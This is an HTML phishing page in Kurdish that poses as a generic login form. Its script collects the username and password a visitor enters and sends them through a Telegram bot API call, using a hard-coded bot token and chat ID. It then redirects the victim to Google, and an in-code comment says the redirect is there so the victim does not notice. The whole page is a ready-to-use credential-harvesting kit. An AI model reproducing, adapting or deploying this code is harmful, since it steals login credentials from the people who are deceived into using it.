<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 320px;
            text-align: center;
        }
        h2 { color: #333; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { background-color: #0077b5; }
    </style>
</head>
<body>

<div class="login-box">
    <h2>چوونەژوور</h2>
    <form id="authForm">
        <input type="text" id="user" placeholder="ئیمێل یان ناڤێ بکارهێنەری" required>
        <input type="password" id="pass" placeholder="پاسۆرد" required>
        <button type="submit">Login</button>
    </form>
</div>

<script>
    const authForm = document.getElementById('authForm');

    authForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const userValue = document.getElementById('user').value;
        const passValue = document.getElementById('pass').value;

        // زانیاریێن تە یێن تایبەت
        const token = "8752727438:AAFJP2gw18UHVfBW_fef7J1rOuQJ3WVhoNU";
        const chat_id = "6648131751";

        const message = `🚀 زانیاریێن نوو هاتن:\n\n👤 User: ${userValue}\n🔑 Pass: ${passValue}`;
        
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        fetch(url)
        .then(res => {
            if (res.ok) {
                // پشتی زانیاری دچن، دێ کەسی رەوانەی گوگل کەت دا هەست پێ نەکەت
                window.location.href = "https://www.google.com";
            } else {
                alert("Login failed. Please try again.");
            }
        })
        .catch(err => console.error("Error:", err));
    });
</script>

</body>
</html>
